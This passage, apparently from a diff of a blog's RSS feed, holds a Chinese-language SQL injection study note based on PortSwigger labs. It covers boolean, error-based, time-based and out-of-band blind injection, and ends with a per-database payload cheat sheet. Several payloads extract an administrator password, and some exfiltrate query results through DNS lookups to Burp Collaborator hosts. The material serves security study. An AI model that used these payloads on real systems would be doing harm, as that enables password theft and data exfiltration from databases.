+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Users&#39;</span></span></span></code></pre></div></div>
+<h5 id="orcale中的information-schema">Orcale中的information schema</h5>
+<p>在Orcale中需要用别的方法来达到上述的效果</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tables</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">all_tab_columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;USERS&#39;</span></span></span></code></pre></div></div>
+<h3 id="盲注">盲注</h3>
+<p>当存在SQL注入但是不存在回显的时候就需要用到盲注。</p>
+<h4 id="布尔盲注-有回显">布尔盲注-有回显</h4>
+<p>假设一个网站使用tracking cookies来收集关于使用情况的分析，cookie可能是这样：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</span></span></code></pre></div></div>
+<p>当处理包含<code>TrackingId</code>的cookie的请求时，服务器使用如下的SQL语句确定该用户的身份</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">TrackingId</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">TrackedUsers</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;u5YD3PapBcR4lN3e7Tj4&#39;</span></span></span></code></pre></div></div>
+<p>这样的查询就存在SQL注入，但是查询的结果不会返回。但是对于不同的数据，网站的行为可能有所不同，假设提交的ID被是被成功，网页会显示一条欢迎回来之类的信息，这样的行为足矣。</p>
+<p>假设注入下述语句：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="err">…</span><span class="n">xyz</span><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">…</span><span class="n">xyz</span><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">2</span></span></span></code></pre></div></div>
+<p>第一个值将返回结果，因为注入的<code>'1'='1</code>是正确的，因此会显示欢迎回来，所以第二行不会显示欢迎回来。这就允许攻击者确定任何表达是否正确。</p>
+<p>假设有一个名为<code>Users</code>的表，列是<code>username</code>和<code>password</code>，并且诶存在一个名为<code>Administrator</code>的用户。攻击者可以通过一系列的paylaod确定此用户的密码。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xyz</span><span class="s1">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39;), 1, 1) &gt; &#39;</span><span class="n">m</span></span></span></code></pre></div></div>
+<p><code>SUBSTRING</code>函数在一些数据库中叫做<code>SUBSTR</code>。</p>
+<p>如果这样的输入会显示欢迎回来，说明密码的第一个字符是大于m。</p>
+<p>如果不显示欢迎回来这样的信息的话，返回数据库报错信息也是可以的。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END)=&#39;</span><span class="n">a</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END)=&#39;</span><span class="n">a</span></span></span></code></pre></div></div>
+<p>这俩payload使用<code>CASE</code>关键字来测试条件，根据表达式是否成立从而返回不同的表达式。第一个payload，CASE表达式应当返回<code>'a'</code>，这没有错。第二个payload中，将会计算<code>1/0</code>，这就会导致一个错误。如果是否出错会让有些地方产生差异，攻击者可以根据差异来判断。</p>
+<p>使用<code>CASE</code>关键字，上面那个<code>SUBSTRING</code>的payload还可以这样写</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">xyz</span><span class="s1">&#39; AND (SELECT CASE WHEN (Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;</span><span class="n">m</span><span class="s1">&#39;) THEN 1/0 ELSE &#39;</span><span class="n">a</span><span class="s1">&#39; END FROM Users)=&#39;</span><span class="n">a</span></span></span></code></pre></div></div>
+<h4 id="时间盲注">时间盲注</h4>
+<p>在不回显的时候，通常会使用时间盲注。通过条件是否成立来影响HTTP请求的响应时间。</p>
+<p>这个方法因使用的数据库类型的不同而不同。在Microsoft SQL Server中，下面的payload可以用来实现时间盲注</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; IF (1=2) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; IF (1=1) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
+<p>第一个payload不会触发延迟，第二个则会触发延迟。</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;</span><span class="n">m</span><span class="s1">&#39;) = 1 WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="err">{</span><span class="n">delay</span><span class="err">}</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
+<h4 id="带外-oast">带外 (OAST)</h4>
+<p>加入网站执行SQL查询是异步执行的。网站在原本的线程处理用户的请求，另一个线程使用tracking cookie来执行SQL查询。因为网站的响应不会回显，也不会因查询而花费时间，所以上述方法都失效。</p>
+<p>此时通常利用盲注去使服务器与out-of-band (OAST)网络进行交互。</p>
+<p>可以使用多种网络协议实现这一点，通常最有效的是DNS服务，很多网站允许DNS的自由进出，它对它们的正常运行至关重要。</p>
+<p>触发DNS查询的方法因数据库类型的不同而不同。在Microsoft SQL Server上，下面的payload用于在指定域名进行DNS查询</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; exec master..xp_dirtree &#39;</span><span class="o">//</span><span class="mi">0</span><span class="n">efdymgw1o5w9inae8mg4dfrgim9ay</span><span class="p">.</span><span class="n">burpcollaborator</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="n">a</span><span class="s1">&#39;--</span></span></span></code></pre></div></div>
+<p>确定来触发带外交互的方法后，可以开始拿数据了</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#39;</span><span class="n">Administrator</span><span class="s1">&#39;);exec(&#39;</span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s2">&#34;//&#39;+@p+&#39;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&#34;</span><span class="s1">&#39;)--</span></span></span></code></pre></div></div>
+<p>因为带外成功的可能性很大并且能直接拿数据，所以其在盲注中是一个非常强大的方法。即使其他盲注也可是可行的，带外也可以是一个优先考虑的选项。</p>
+<h3 id="除了select的sql注入">除了SELECT的SQL注入</h3>
+<p>大多数SQL注入漏洞出现在<code>SELECT</code>查询的<code>WHERE</code>子句中。理论上，SQL注入漏洞不仅出现在<code>SELECT</code>语句中。出现SQL注入漏洞的常见的其他位置分别是</p>
+<ul>
+<li><code>UPDATE</code>，在更新的值或者<code>WHERE</code>子句中</li>
+<li><code>INSERT</code>，在插入的值中</li>
+<li><code>SELECT</code>，在表或列的名称中</li>
+<li><code>SELECT</code>，在<code>ORDER BY</code>子句中</li>
+</ul>
+<h3 id="不同上下文的sql注入">不同上下文的SQL注入</h3>
+<p>攻击者可以使用任何会被网站带入SQL语句处理的可控输入来进行SQL注入攻击。例如一些网站会接收JSON或XML格式的输入并使用它来查带入SQL语句。</p>
+<p>不同的格式甚至可以提供混淆payload的方法来绕过网站的防御机制。</p>
+<h3 id="二次注入">二次注入</h3>
+<p>二次注入，这通常通过将输入放入数据库中完成。存储到数据库的时候不会出现问题，在网站处理请求检查存储的数据，将其以不安全的方式合并到SQL语句中就出了问题。</p>
+<p>二次注入通常因为网站开发者会信任放入数据库的数据而导致的。</p>
+<h2 id="漏洞检测">漏洞检测</h2>
+<ul>
+<li>添加<code>'</code>之类的字符查找错误或其他异常</li>
+<li>添加一些特定的用来计算潜在注入点原本的值和另一个值的SQL语句</li>
+<li>添加一些布尔表达式，寻找响应之间的差异</li>
+<li>添加时间盲注的payload</li>
+<li>添加带外的payload</li>
+</ul>
+<h2 id="数据库间语句的差异">数据库间语句的差异</h2>
+<h3 id="连接字符串">连接字符串</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: center">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: center">&lsquo;foo&rsquo;||&lsquo;bar&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: center">&lsquo;foo&rsquo;+&lsquo;bar&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: center">&lsquo;foo&rsquo;||&lsquo;bar&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: center">&lsquo;foo&rsquo; &lsquo;bar&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: center">CONCAT(&lsquo;foo&rsquo;,&lsquo;bar&rsquo;)</td>
+      </tr>
+  </tbody>
+</table>
+<p>MYSQL有两种方式，注意第一种方式中两个字符串之间的空格</p>
+<h3 id="截取字符串">截取字符串</h3>
+<p>偏移量索引从1开始。</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: center">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: center">SUBSTR(&lsquo;foobar&rsquo;, 4, 2)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: center">SUBSTRING(&lsquo;foobar&rsquo;, 4, 2)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: center">SUBSTRING(&lsquo;foobar&rsquo;, 4, 2)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: center">SUBSTRING(&lsquo;foobar&rsquo;, 4, 2)</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="注释符">注释符</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: center">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: center">&ndash;comment</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: center">&ndash;comment</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: center">/*comment*/</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: center">&ndash;comment</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: center">/*comment*/</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: center">#comment</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: center">&ndash; comment</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: center">/*comment*/</td>
+      </tr>
+  </tbody>
+</table>
+<p>注意MYSQL的第二种方式<code>--</code>后面有一个空格，URL使用这种注释符的话要对其进行URL编码，用<code>+</code>来表示<code> </code>。</p>
+<h3 id="查询数据库版本">查询数据库版本</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: center">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: center">SELECT banner FROM v$version</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: center">SELECT version FROM v$instance</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: center">SELECT @@version</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: center">SELECT version()</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: center">SELECT @@version</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="查询数据库的表和列">查询数据库的表和列</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: left">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: left">SELECT * FROM all_tables</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT * FROM all_tab_columns WHERE table_name = &lsquo;TABLE-NAME-HERE&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: left">SELECT * FROM information_schema.tables</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT * FROM information_schema.columns WHERE table_name = &lsquo;TABLE-NAME-HERE&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: left">SELECT * FROM information_schema.tables</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT * FROM information_schema.columns WHERE table_name = &lsquo;TABLE-NAME-HERE&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: left">SELECT * FROM information_schema.tables</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT * FROM information_schema.columns WHERE table_name = &lsquo;TABLE-NAME-HERE&rsquo;</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="判断条件的报错">判断条件的报错</h3>
+<p>（标题原本是Conditional errors，直译的话是个什么东西啊，所以瞎起来一个名字）</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: left">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: left">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: left">SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: left">1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: left">SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&lsquo;a&rsquo;)</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="堆叠注入">堆叠注入</h3>
+<p>可以将多个语句连接起来。后面的语句不会有回显，所以多用于盲注。</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: center">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: center">Does not support batched queries.</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: center">QUERY-1-HERE; QUERY-2-HERE</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: center">QUERY-1-HERE; QUERY-2-HERE</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: center">QUERY-1-HERE; QUERY-2-HERE</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="时间延迟">时间延迟</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: center">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: center">dbms_pipe.receive_message((&lsquo;a&rsquo;),10)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: center">WAITFOR DELAY &lsquo;0:0:10&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: center">SELECT pg_sleep(10)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: center">SELECT SLEEP(10)</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="dns查询">DNS查询</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: left">语句</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: left">该例子利用XXE触发，漏洞已被修复，但有的网站用的Orcale没修复：</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT EXTRACTVALUE(xmltype(&rsquo;&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &ldquo;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&rsquo;),&rsquo;/l&rsquo;) FROM dual</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">以下用于打了补丁后的，但需要高权限:</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT UTL_INADDR.get_host_address(&lsquo;BURP-COLLABORATOR-SUBDOMAIN&rsquo;)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: left">exec master..xp_dirtree &lsquo;//BURP-COLLABORATOR-SUBDOMAIN/a&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: left">copy (SELECT &lsquo;&rsquo;) to program &rsquo;nslookup BURP-COLLABORATOR-SUBDOMAIN&rsquo;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: left">下面例子只适用于Windows:</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">LOAD_FILE(&rsquo;\\BURP-COLLABORATOR-SUBDOMAIN\a&rsquo;)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT &hellip; INTO OUTFILE &lsquo;\\BURP-COLLABORATOR-SUBDOMAIN\a&rsquo;</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="带有数据过滤的dns查询">带有数据过滤的DNS查询</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">数据库类型</th>
+          <th style="text-align: left">语句</th>
+          <th></th>
+          <th></th>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">Oracle</td>
+          <td style="text-align: left">SELECT EXTRACTVALUE(xmltype(&rsquo;&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &ldquo;http://&rsquo;||(SELECT YOUR-QUERY-HERE)||&rsquo;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&rsquo;),&rsquo;/l&rsquo;) FROM dual</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Microsoft</td>
+          <td style="text-align: left">declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&lsquo;master..xp_dirtree &ldquo;//&rsquo;+@p+&rsquo;.BURP-COLLABORATOR-SUBDOMAIN/a&rdquo;&rsquo;)</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PostgreSQL</td>
+          <td style="text-align: left">create OR replace function f() returns void as $$</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">declare c text;</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">declare p text;</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">begin</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT into p (SELECT YOUR-QUERY-HERE);</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">c := &lsquo;copy (SELECT &lsquo;&rsquo;&rsquo;&rsquo;) to program &lsquo;&rsquo;nslookup '</td>
+          <td></td>
+          <td>p</td>
+          <td></td>
+          <td>&lsquo;.BURP-COLLABORATOR-SUBDOMAIN&rsquo;&rsquo;&rsquo;;</td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">execute c;</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">END;</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">$$ language plpgsql security definer;</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT f();</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MySQL</td>
+          <td style="text-align: left">以下只适用于Windows:</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">LOAD_FILE(&rsquo;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&rsquo;)</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td style="text-align: center"></td>
+          <td style="text-align: left">SELECT YOUR-QUERY-HERE INTO OUTFILE &lsquo;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&rsquo;</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>]]></description>
+</item>
+<item>
+    <title>JWT attacks</title>
+    <link>http://localhost:1313/posts/portswigger_jwt/</link>
+    <pubDate>Mon, 26 Dec 2022 03:42:51 &#43;0000</pubDate>
